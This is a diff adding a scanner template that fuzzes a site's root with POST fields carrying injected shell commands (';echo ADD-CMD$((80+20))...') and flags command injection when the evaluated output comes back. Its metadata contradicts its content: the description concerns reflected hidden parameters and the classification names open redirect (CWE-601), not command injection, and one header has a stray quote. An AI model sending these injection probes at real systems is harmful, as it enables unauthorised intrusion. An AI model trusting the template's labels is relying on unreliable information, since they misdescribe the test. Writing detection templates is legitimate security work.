@@ -1,0 +1,40 @@
+id: 4rcepost
+
+info:
+  name: 4rcepost
+  author: erickfernandox
+  severity: medium
+  description: |
+    Verifica parametros ocultos que refletem dentro do HTML da pagina
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-601
+  metadata:
+    max-request: 2
+  tags: fuzzer, generic
+
+
+
+http:
+  - raw:
+    - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: "{{BaseURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+        
+        curl=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&backtick_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&os_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&exec_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&proc_open=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&popen=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&passthru=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&system_exec=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '[mci extensions]'
+          - 'ADD-CMD100GAURAVGAURAV'
